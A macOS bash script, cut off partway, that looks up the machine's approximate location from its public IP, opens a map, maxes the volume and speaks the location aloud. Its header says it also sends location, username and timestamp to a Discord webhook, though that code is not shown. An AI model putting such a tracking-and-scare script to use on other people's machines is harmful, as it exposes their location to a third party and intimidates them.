#!/bin/bash
# This script retrieves your approximate geolocation using your public IP (via ip-api.com),
# opens a map with your coordinates, sets your system volume to maximum,
# speaks a custom message (or a default one based on your location),
# and sends the collected information (with timestamp and username) to a Discord webhook.
#
# Requirements:
# - macOS
# - curl, python3, osascript, say (usually available by default)
#
# Usage:
#   ./location_script.sh "Your custom message here"
# If no message is provided, a default message based on your location is spoken.

# Retrieve geolocation information from ip-api.com
geo_json=$(curl -s http://ip-api.com/json)

# Use python3 to parse JSON and extract fields
latitude=$(echo "$geo_json" | python3 -c "import sys, json; print(json.load(sys.stdin).get('lat', ''))")
longitude=$(echo "$geo_json" | python3 -c "import sys, json; print(json.load(sys.stdin).get('lon', ''))")
city=$(echo "$geo_json" | python3 -c "import sys, json; print(json.load(sys.stdin).get('city', ''))")
region=$(echo "$geo_json" | python3 -c "import sys, json; print(json.load(sys.stdin).get('regionName', ''))")
country=$(echo "$geo_json" | python3 -c "import sys, json; print(json.load(sys.stdin).get('country', ''))")

# Check that latitude and longitude were retrieved
if [ -z "$latitude" ] || [ -z "$longitude" ]; then
    echo "Failed to retrieve geolocation."
    exit 1
fi

echo "Your location: Latitude $latitude, Longitude $longitude"
echo "Location details: $city, $region, $country"

# Construct Google Maps URL and open it in the default browser
map_url="https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}"
echo "Opening map: $map_url"
open "$map_url"

# Set system volume to maximum using AppleScript
osascript -e 'set volume output volume 100'

# Determine the message to speak:
# If a custom message is provided as an argument, use it; otherwise, use a default message.
if [ -n "$1" ]; then
    message="$1"
else
    message="Your approximate location is $city, $region, $country."
fi

echo "Speaking message: $message"
say "$message"

# Get the current username for logging purposes
